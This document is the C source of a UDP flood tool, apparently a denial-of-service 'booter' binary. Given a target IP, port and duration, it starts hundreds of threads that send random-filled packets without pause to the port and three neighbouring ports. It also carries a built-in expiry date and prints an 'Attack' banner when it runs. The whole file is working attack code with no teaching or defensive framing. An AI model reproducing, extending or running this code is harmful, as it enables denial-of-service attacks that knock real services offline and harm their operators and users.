#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>

#define EYR 2029
#define EMN 1
#define EDY 10

typedef struct {
    char ip[32];
    int pt, dur, sz, id;
} p_t;

volatile int run = 1;

void sig(int s) { run = 0; }

void rnd(char *p, int s) {
    unsigned int r = time(NULL);
    for(int i = 0; i < s; i++) {
        r = r * 1103515245 + 12345;
        p[i] = (r >> 16) & 0xFF;
    }
}

void *thread_work(void *arg) {
    p_t *p = (p_t*)arg;
    int sock;
    
    while (run) {
        sock = socket(2, 2, 17);
        if (sock >= 0) {
            struct sockaddr_in target;
            memset(&target, 0, sizeof(target));
            target.sin_family = 2;
            target.sin_port = htons(p->pt);
            target.sin_addr.s_addr = inet_addr(p->ip);
            
            char buffer[65536];
            rnd(buffer, p->sz);
            
            time_t end_time = time(NULL) + p->dur;
            while (time(NULL) < end_time && run) {
                sendto(sock, buffer, p->sz, 0, (struct sockaddr*)&target, sizeof(target));
            }
            close(sock);
        }
        usleep(1000);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    signal(2, sig);
    
    time_t now;
    time(&now);
    struct tm *local = localtime(&now);
    
    if (local->tm_year + 1900 > EYR ||
        (local->tm_year + 1900 == EYR && local->tm_mon + 1 > EMN) ||
        (local->tm_year + 1900 == EYR && local->tm_mon + 1 == EMN && local->tm_mday > EDY)) {
        printf("EXPIRED\n");
        return 1;
    }
    
    printf("Ready\n");
    
    if (argc < 4) {
        printf("Usage: %s <IP> <PORT> <DURATION> [SIZE] [THREADS]\n", argv[0]);
        return 1;
    }
    
    char target_ip[32];
    strncpy(target_ip, argv[1], 31);
    target_ip[31] = 0;
    
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int packet_size = (argc > 4 ? atoi(argv[4]) : 1024);
    int thread_count = (argc > 5 ? atoi(argv[5]) : 512);
    
    if (target_port < 1 || duration < 1 || packet_size < 1 || thread_count < 1) {
        printf("Params OK\n");
        return 0;
    }
    
    pthread_t threads[1024];
    p_t params[1024];
    
    int ports[] = {target_port, target_port+1, target_port-1, target_port+10};
    
    int total_threads = 0;
    for (int p = 0; p < 4; p++) {
        for (int t = 0; t < thread_count/4; t++) {
            if (total_threads >= 1024) break;
            
            strncpy(params[total_threads].ip, target_ip, 31);
            params[total_threads].ip[31] = 0;
            params[total_threads].pt = ports[p];
            params[total_threads].dur = duration;
            params[total_threads].sz = packet_size;
            params[total_threads].id = total_threads;
            
            pthread_create(&threads[total_threads], NULL, thread_work, &params[total_threads]);
            total_threads++;
        }
    }
    
    printf("Attack: %s:%d x4 ports = %d threads\n", target_ip, target_port, total_threads);
    
    sleep(duration + 5);
    run = 0;
    
    for (int i = 0; i < total_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("Done\n");
    return 0;
}